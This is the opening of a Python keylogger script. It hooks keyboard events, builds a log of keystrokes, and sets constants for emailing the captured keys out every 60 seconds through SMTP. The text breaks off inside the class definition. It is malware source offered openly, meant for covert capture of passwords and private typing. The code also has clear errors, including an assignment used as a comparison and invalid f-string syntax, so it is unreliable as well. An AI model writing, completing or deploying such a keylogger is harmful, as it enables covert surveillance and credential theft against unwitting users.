#!/usr/bin/env python3

import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#Send report every n seconds
SEND_REPORT_EVERY = 60 

#Email address and password to send logged keys to
EMAIL_ADDRESS = ''
EMAIL_PASSWORD = ''

class Keylogger:
	def __init__(self, interval, report_method):
		self.interval = interval
		self.report_method = report_method
		self.log = ''
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()

	def callback(self, event):
		name = event.name
		if len(name) > 1:
			if name == 'space':
				name = ' '
			elif name == 'enter':
				name = '\n'
			elif name = 'decimal':
				name = '.'
			else:
				name.replace(' ', '_')
				name = f[{name.upper()}]
		self.log += name

	def update_filename(self):
		start_dt_str = str(self.start_dt)[:7].replace(' ', '-').replace(':', '')
		end_dt_str = str(self.end_dt)[:7].replace(' ', '-').replace(':', '')
		self.filename = f'keylog-{start_dt_str}_{end_dt_str}'

	